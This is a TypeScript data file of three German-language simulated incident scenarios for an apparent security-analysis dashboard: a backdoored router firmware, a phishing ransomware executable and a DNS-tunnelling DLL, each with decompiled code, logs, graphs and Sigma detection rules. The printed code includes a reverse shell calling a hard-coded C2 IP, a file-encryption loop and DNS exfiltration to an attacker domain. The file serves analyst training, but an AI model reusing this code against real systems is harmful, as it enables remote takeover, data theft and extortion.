import { Scenario } from "./types";

export const SCENARIOS: Scenario[] = [
  {
    id: 'szenario_a',
    title: 'IoT-Firmware Backdoor (Mirai-Clone)',
    category: 'Firmware & Network Compromise',
    description: 'Eine modifizierte Firmware-Datei eines Edge-Routers schleust eine manipulierte SSH-Daemon-Version ein. Diese baut eine Reverse-Verbindung zu einem C2-Server im Tor-Netzwerk auf.',
    targetDevice: 'TP-Link WR841n Edge-Router (v12)',
    ingestFile: {
      name: 'tplink_wr841n_v12_patched.bin',
      size: '7.82 MB',
      type: 'Flash Firmware ROM Binärdatei',
      source: 'Erfasst über Emissary Monitoring-Endpoint auf einem unverschlüsselten Update-Spiegel.',
      hash: 'sha256:d8c1fda88496bc103cb92b8d8ad3b91c4d4c88eae0d1bf4b09e2cf3ade93bbdd',
      entropy: 7.95
    },
    firmwareDetails: {
      fileSystem: 'SquashFS (Little Endian)',
      partitions: ['bootloader (128 KB)', 'kernel (1.5 MB)', 'rootfs (6.1 MB)', 'config (64 KB)'],
      entropyScore: 7.95, // High entropy indicating zipped squashfs filesystem and some encrypted sections
      unpackedBinaries: ['/usr/sbin/dropbear', '/bin/busybox', '/usr/bin/upnpd', '/usr/sbin/httpd']
    },
    ghidraReports: [
      {
        binaryName: 'dropbear_patched',
        functions: [
          {
            name: 'main',
            address: '0x00401a20',
            description: 'Standard Dropbear SSH Initialisierung mit verstecktem Funktionsaufruf.',
            decompiled: `
int main(int argc, char **argv) {
    init_ssh_daemonConfig();
    parse_options(argc, argv);
    
    // Konfiguriere Standard SSH Sockets
    setup_listeners();
    
    // BACKDOOR TRIGGER: Versteckte Verzweigung
    // Versuche unbemerkt eine Verbindung zum C2 herstellen
    if (fork() == 0) {
        establish_comms_callback();
    }
    
    // Hauptschleife des Daemons
    start_event_loop();
    return 0;
}
            `.trim()
          },
          {
            name: 'establish_comms_callback',
            address: '0x0041bf90',
            description: 'Baut die TCP-Socket-Verbindung auf und leitet eine SSH-Shell ein.',
            decompiled: `
void establish_comms_callback() {
    int sock_fd;
    struct sockaddr_in server_addr;
    char *c2_server = "185.220.101.5"; // Hardcodiertes C2 Gateway
    int c2_port = 443;
    
    sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_fd < 0) return;
    
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(c2_port);
    server_addr.sin_addr.s_addr = inet_addr(c2_server);
    
    // Verbindungsaufbau im Hintergrund (alle 60 Sekunden bei Fehlschlag)
    while (connect(sock_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        sleep(60);
    }
    
    // Leite Standardausgänge auf den Socket um (Reverse Shell)
    dup2(sock_fd, 0); // stdin
    dup2(sock_fd, 1); // stdout
    dup2(sock_fd, 2); // stderr
    
    // Führe Shell aus mit Administratorrechten
    char *args[] = {"/bin/sh", "-i", NULL};
    execve(args[0], args, NULL);
}
            `.trim()
          }
        ],
        strings: [
          { value: '185.220.101.5', address: '0x40ef1a', classification: 'IP / C2-Indikator' },
          { value: '/bin/sh', address: '0x40ef24', classification: 'Systempfad / Shell' },
          { value: 'backdoor_admin_override', address: '0x40f01a', classification: 'Klartext-Passwort' },
          { value: 'DEBUG: dropbear patched payload listening', address: '0x40f800', classification: 'Debug-String' }
        ],
        symbols: [
          { name: 'establish_comms_callback', type: 'Function', address: '0x0041bf90' },
          { name: 'execve', type: 'External API Call', address: '0x0045aa20' },
          { name: 'inet_addr', type: 'External API Call', address: '0x0045ac08' }
        ]
      }
    ],
    graphData: {
      nodes: [
        { id: 'fw_img', label: 'tplink_wr841n_v12_patched.bin', type: 'fw', description: 'Manipuliertes Router-Firmware-ROM', severity: 'medium' },
        { id: 'binary_db', label: '/usr/sbin/dropbear', type: 'file', description: 'Manipulierter SSH Daemon', severity: 'high' },
        { id: 'shell_proc', label: '/bin/sh -i', type: 'process', description: 'Administrativer interaktiver Shell-Prozess', severity: 'high' },
        { id: 'c2_ip', label: '185.220.101.5:443', type: 'ip', description: 'Böswillige C2-Brücke im Tor-Netzwerk', severity: 'high' },
        { id: 'router_gateway', label: 'Router Gateway (192.168.1.1)', type: 'ip', description: 'Haupt-Gateway des infiltrierten Netzwerks', severity: 'none' }
      ],
      edges: [
        { source: 'fw_img', target: 'binary_db', label: 'enthält_binary' },
        { source: 'binary_db', target: 'shell_proc', label: 'spawnt' },
        { source: 'binary_db', target: 'c2_ip', label: 'kontaktiert_port_443' },
        { source: 'router_gateway', target: 'binary_db', label: 'führt_aus' }
      ]
    },
    datawaveLogs: [
      { id: 'log_001', timestamp: '2026-05-27T08:45:10Z', category: 'Firmware', source: 'Hardware-Module', eventCode: 'FW_EXTRACT_01', message: 'SquashFS-Dateisystem aus tplink_wr841n_v12_patched.bin erfolgreich extrahiert.', severity: 'low' },
      { id: 'log_002', timestamp: '2026-05-27T08:45:12Z', category: 'Firmware', source: 'Ghidra-Connector', eventCode: 'RE_AUTO_ANALYSIS', message: 'Binary /usr/sbin/dropbear zur automatischen Dekompilierung eingereiht (MIPS Befehlssatz erkannt).', severity: 'low' },
      { id: 'log_003', timestamp: '2026-05-27T08:46:01Z', category: 'Network', source: 'Suricata-NIDS', eventCode: 'SURICATA_2019941', message: 'Verbindung von IoT-Gerät (192.168.1.1) zu bekanntem Command-and-Control Server IP 185.220.101.5 auf Port 443.', severity: 'high' },
      { id: 'log_004', timestamp: '2026-05-27T08:46:02Z', category: 'System', source: 'Syslog-Router', eventCode: 'SSH_SESSION_START', message: 'Ghidra Symbol-Korrelation: Aufruf von "establish_comms_callback" in laufendem Prozess ID 491.', severity: 'high' },
      { id: 'log_005', timestamp: '2026-05-27T08:47:00Z', category: 'Audit', source: 'Emissary-Ingest', message: 'Paketfluss-Korrelation: 185.220.101.5 sendete 45 KB Daten, die direkt in MIPS-Shell-Prozess gefüttert wurden.', severity: 'medium' }
    ],
    elitewolfAlerts: [
      {
        id: 'alert_a1',
        timestamp: '2026-05-27T08:46:03Z',
        ruleName: 'Embedded_Reverse_Shell_Connection_IoT',
        mitreTactics: ['Command and Control', 'Defense Evasion'],
        mitreIds: ['T1071.001', 'T1059.004'],
        description: 'Eine unübliche SSH-Deaktivierungskorrelation oder eine direkte Reverse-Shell von einem IoT-Gerät ins Internet wurde erkannt.',
        status: 'Neu',
        severity: 'high',
        sigmaRule: `
title: Suspicious Patched Dropbear Daemon
id: b5e7da47-49f3-4e31-893d-d1be8e9cfed2
status: experimental
description: Erkennt anormale Socketverbindungen, die direkt aus dem Dropbear Executable über execve gestartet werden.
logsource:
    category: network_connection
    product: linux
detection:
    selection_dest:
        DestinationIp: '185.220.101.' # C2 Netzbereich
        DestinationPort: 443
    selection_proc:
        Image: '*/dropbear'
    condition: selection_dest and selection_proc
level: critical
        `.trim()
      }
    ]
  },
  {
    id: 'szenario_b',
    title: 'Ransomware-Angriff über Phishing-Anhang',
    category: 'Endpoint Compromise',
    description: 'Eine angebliche PDF/Excel-Rechnung entpuppt sich als Windows-Binärdatei, die versucht wichtige Benutzerdateien mit AES-GCM zu verschlüsseln.',
    targetDevice: 'Windows 10 Enterprise (HR-Abteilung)',
    ingestFile: {
      name: 'Rechnung_34211_OFFICE.xlsx.exe',
      size: '2.34 MB',
      type: 'PE32 Windows Executable',
      source: 'Automatisch extrahiert aus dem Postfach von hr-department@corp.de über Emissary-Mail-Parser.',
      hash: 'sha256:8f4ca3b84fde90cb1a02b37bd3ff7bb98fe37f10b77e2310beefad93bc712aa1',
      entropy: 6.42
    },
    ghidraReports: [
      {
        binaryName: 'Rechnung_34211_OFFICE.exe',
        functions: [
          {
            name: 'WinMain',
            address: '0x00401000',
            description: 'Einstiegspunkt. Überprüft, ob Debugger vorhanden sind, beendet sich falls ja.',
            decompiled: `
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    if (IsDebuggerPresent()) {
        ExitProcess(0); // Anti-Analyse-Schutz
    }
    
    // Starte Thread zur Verschlüsselung von Laufwerk C:
    HANDLE thread = CreateThread(NULL, 0, CryptorPayload, NULL, 0, NULL);
    WaitForSingleObject(thread, INFINITE);
    
    // Erstelle Lösegeldforderung
    WriteRansomNote();
    return 0;
}
            `.trim()
          },
          {
            name: 'CryptorPayload',
            address: '0x00405230',
            description: 'Durchläuft Ordner und verschlüsselt .pdf, .docx, .xlsx, .zip Dokumente mit AES.',
            decompiled: `
DWORD WINAPI CryptorPayload(LPVOID lpParam) {
    char target_path[MAX_PATH] = "C:\\\\Users";
    char ransom_key[32] = {0x1a, 0xfc, 0xc1, 0xef, 0x12, 0xc9 ...}; // AES-Schlüssel
    
    // Suche nach Dateien
    WIN32_FIND_DATA find_data;
    HANDLE hFind = FindFirstFile("C:\\\\Users\\\\*.*", &find_data);
    
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (is_target_extension(find_data.cFileName)) {
                // Verschlüssele Datei synchron
                encrypt_file_aes_gcm(find_data.cFileName, ransom_key);
                rename_file_extension(find_data.cFileName, ".crypto-ransom");
            }
        } while (FindNextFile(hFind, &find_data));
    }
    return 0;
}
            `.trim()
          }
        ],
        strings: [
          { value: '.crypto-ransom', address: '0x40fa18', classification: 'Ransom-Extension' },
          { value: 'ALL YOUR FILES ARE ENCRYPTED! Read INSTRUCTIONS.txt', address: '0x40fe20', classification: 'Erpresserschreiben' },
          { value: 'Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run', address: '0x410a50', classification: 'Registry-Autostart' }
        ],
        symbols: [
          { name: 'IsDebuggerPresent', type: 'Anti-Analysis API Call', address: '0x0043aa10' },
          { name: 'RegCreateKeyExA', type: 'Registry Manipulation API', address: '0x0043b2cf' },
          { name: 'BCryptEncrypt', type: 'Cryptographic API Call', address: '0x0043cf12' }
        ]
      }
    ],
    graphData: {
      nodes: [
        { id: 'email_attachment', label: 'Rechnung_34211_OFFICE.xlsx.exe', type: 'file', description: 'Böswilliger Phishing-Mailanhang', severity: 'high' },
        { id: 'reg_key', label: 'HKLM\\..\\Run\\WindowsSystemUpdate', type: 'file', description: 'Autostart-Eintrag zur Persistenz', severity: 'medium' },
        { id: 'ransom_note', label: 'INSTRUCTIONS.txt', type: 'file', description: 'Lösegeldforderung im Benutzerverzeichnis', severity: 'high' },
        { id: 'victim_host', label: 'WS-HR-LEITUNG (192.168.12.8)', type: 'user', description: 'Zielrechner von HR-Direktor', severity: 'none' },
        { id: 'cryptor_thread', label: 'CryptorPayload', type: 'process', description: 'Schad-Thread des Ransomware-Prozesses', severity: 'high' }
      ],
      edges: [
        { source: 'victim_host', target: 'email_attachment', label: 'öffnet_datei' },
        { source: 'email_attachment', target: 'cryptor_thread', label: 'spawnt_thread' },
        { source: 'cryptor_thread', target: 'reg_key', label: 'schreibt_registry' },
        { source: 'cryptor_thread', target: 'ransom_note', label: 'erstellt_datei' }
      ]
    },
    datawaveLogs: [
      { id: 'log_201', timestamp: '2026-05-27T07:12:00Z', category: 'Network', source: 'Emissary-SMTP-Proxy', eventCode: 'MAIL_SCAN_01', message: 'Verdächtige PE-Datei (doppelte Endung .xlsx.exe) aus E-Mail extrahiert.', severity: 'medium' },
      { id: 'log_202', timestamp: '2026-05-27T07:13:02Z', category: 'System', source: 'Windows-Defender', eventCode: 'SYS_PROC_CREATION', message: 'Prozess-Start: Rechnung_34211_OFFICE.xlsx.exe durch hr-leader_desktop.', severity: 'low' },
      { id: 'log_203', timestamp: '2026-05-27T07:13:05Z', category: 'System', source: 'Registry-Monitor', eventCode: 'REG_WRITE', message: 'Schreibzugriff auf HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run durch Prozess Rechnung_34211_OFFICE.xlsx.exe', severity: 'medium' },
      { id: 'log_204', timestamp: '2026-05-27T07:13:10Z', category: 'System', source: 'File-System-Audit', eventCode: 'BULK_WRITE', message: 'Warnung: Über 150 Schreib- und Löschvorgänge mit Dateiendungsänderung (.crypto-ransom) in unter 5 Sekunden.', severity: 'high' }
    ],
    elitewolfAlerts: [
      {
        id: 'alert_b1',
        timestamp: '2026-05-27T07:13:11Z',
        ruleName: 'Potential_Ransomware_Mass_Encryption_V2',
        mitreTactics: ['Impact', 'Persistence'],
        mitreIds: ['T1486', 'T1547.001'],
        description: 'Massenhafte Dateiumbenennung und -verschlüsselung bei gleichzeitigem Erstellen von Registry-Autostartschlüsseln detektiert.',
        status: 'Neu',
        severity: 'high',
        sigmaRule: `
title: Mass Encryption Behavior Log
id: 3c8e5fa7-fa21-4231-9a7c-f1be2340abc8
status: stable
description: Detektiert hohe Schreibaktivität mit der Erstellung von Lösegeldnachrichten oder untypischen Endungen.
logsource:
    category: file_event
    product: windows
detection:
    selection_write:
        TargetFilename|endswith: '.crypto-ransom'
    selection_threshold:
        Count: 30
        Timeframe: 5s
    condition: selection_write
level: critical
        `.trim()
      }
    ]
  },
  {
    id: 'szenario_c',
    title: 'APT C2-Kommunikation in DNS-Tunneling',
    category: 'Advanced Threat / Exfiltration',
    description: 'Eine Schadsoftware verwendet manipulierten DNS-Verkehr (DNS Tunneling), um vertrauliche Active-Directory-Hashes an externe Nameserver weiterzuleiten (bypasst Firewalls).',
    targetDevice: 'Domain Controller (DC-CORP-01)',
    ingestFile: {
      name: 'updater_helper.dll',
      size: '1.14 MB',
      type: 'Dynamic Link Library (DLL/64-Bit)',
      source: 'Gezielte Anomalie-Untersuchung von System-Verzeichnissen auf dem Domain Controller (DC-CORP-01) durch Emissary.',
      hash: 'sha256:4ca2f93bc712aa18f4ca3b84fde90cb1a02b37bd3ff7bb98fe37f10b77e2310b',
      entropy: 5.92
    },
    ghidraReports: [
      {
        binaryName: 'updater_helper.dll',
        functions: [
          {
            name: 'Export_DnsQueryPayload',
            address: '0x18001200',
            description: 'Kodiert Daten in Base32 und startet eine DNS-Abfrage für Subdomains, um Firewalls zu umgehen.',
            decompiled: `
__declspec(dllexport) void Export_DnsQueryPayload(char *data_to_exfiltrate) {
    char base32_payload[512] = {0};
    char target_query[1024] = {0};
    char *malicious_ns = "ns.corp-microsoft-updates.online";
    
    // Kodierungsroutine
    base32_encode(data_to_exfiltrate, base32_payload);
    
    // Verkette zu Subdomain: [Base32Data].[MaliciousNameserver]
    sprintf(target_query, "%s.%s", base32_payload, malicious_ns);
    
    // Sende DNS-Abfragen vom Typ TXT
    PDNS_RECORD pDnsRecord;
    DnsQuery_A(target_query, DNS_TYPE_TEXT, DNS_QUERY_BYPASS_CACHE, NULL, &pDnsRecord, NULL);
    
    // Zerstöre DNS Memory
    if (pDnsRecord != NULL) {
        DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
    }
}
            `.trim()
          }
        ],
        strings: [
          { value: 'corp-microsoft-updates.online', address: '0x1800ef00', classification: 'Verdächtige Domain' },
          { value: 'SAM_hash_extraction', address: '0x1800ef2a', classification: 'Aktivitäts-Indikator' },
          { value: 'DnsQuery_A', address: '0x1800fbc0', classification: 'System API' }
        ],
        symbols: [
          { name: 'DnsQuery_A', type: 'DNS API Call', address: '0x0055bc10' },
          { name: 'sprintf', type: 'String Helper', address: '0x0055cb42' }
        ]
      }
    ],
    graphData: {
      nodes: [
        { id: 'exfiltrator_dll', label: 'updater_helper.dll', type: 'file', description: 'Böswillige Dynamic-Link-Library', severity: 'high' },
        { id: 'domain_controller', label: 'DC-CORP-01 (Domain Controller)', type: 'user', description: 'Kritischer Host mit Administratorrechten', severity: 'high' },
        { id: 'legit_dns_sever', label: 'Interner DNS-Forwarder (10.0.0.10)', type: 'ip', description: 'Normaler legitimer DNS-Server', severity: 'none' },
        { id: 'dns_ns_gateway', label: 'corp-microsoft-updates.online', type: 'ip', description: 'Gekaperte Registrierte Nameserver-Domain des Angreifers', severity: 'high' }
      ],
      edges: [
        { source: 'domain_controller', target: 'exfiltrator_dll', label: 'lädt_dll_über_rundll32' },
        { source: 'exfiltrator_dll', target: 'legit_dns_sever', label: 'sendet_scheinbar_normale_dns_abfrage' },
        { source: 'legit_dns_sever', target: 'dns_ns_gateway', label: 'forwarded_TXT_an_nameserver' }
      ]
    },
    datawaveLogs: [
      { id: 'log_301', timestamp: '2026-05-27T06:01:00Z', category: 'System', source: 'Audit-Log', eventCode: 'PROCESS_LOAD_LIBRARY', message: 'DLL updater_helper.dll wurde dynamic geladen von lsass.exe (ID: 612).', severity: 'high' },
      { id: 'log_302', timestamp: '2026-05-27T06:01:05Z', category: 'Network', source: 'Core-Switch-Flow', eventCode: 'DNS_QUERY_PEAK', message: '780 DNS-TXT-Abfragen mit sehr hoher Subdomain-Länge (z.B. MFRGG2C2NJWGS3T...online) innerhalb von 15 Sekunden.', severity: 'high' },
      { id: 'log_303', timestamp: '2026-05-27T06:01:10Z', category: 'Network', source: 'Firewall-Gate', message: 'DNS-Verkehr erlaubt zu Nameserver corp-microsoft-updates.online.', severity: 'medium' }
    ],
    elitewolfAlerts: [
      {
        id: 'alert_c1',
        timestamp: '2026-05-27T06:01:08Z',
        ruleName: 'DNS_Tunneling_Exfiltration_Detected',
        mitreTactics: ['Exfiltration', 'Command and Control'],
        mitreIds: ['T1048.003', 'T1071.004'],
        description: 'Massenhafte DNS TXT/NULL Abfragestatistik detektiert hochvolumiges Daten-Tunneling getarnt als DNS Traffic.',
        status: 'Neu',
        severity: 'high',
        sigmaRule: `
title: High Volume DNS Subdomain Exfiltration
id: 5a8e1dfc-ab8f-4ed3-bcbc-12defabc4423
status: stable
description: Detektiert untypisch lange Subdomains oder rasante DNS-Anfragen für Subdomains einer unklassifizierten Domain.
logsource:
    category: dns_query
    product: core_network
detection:
    selection_length:
        QueryLength|gt: 100
    selection_frequency:
        Count: 100
        Timeframe: 30s
    condition: selection_length and selection_frequency
level: critical
        `.trim()
      }
    ]
  }
];
